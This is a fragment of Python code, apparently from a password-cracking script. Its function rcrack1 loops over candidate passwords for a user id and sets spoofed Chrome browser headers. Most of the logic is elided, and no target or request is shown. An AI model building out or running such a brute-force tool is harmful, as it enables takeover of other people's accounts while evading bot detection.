...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="122.0.6312.207", "Google Chrome";v="122.0.6312.207"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            ...
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6312.207 Safari/537.36',
            'viewport-width': '980',}
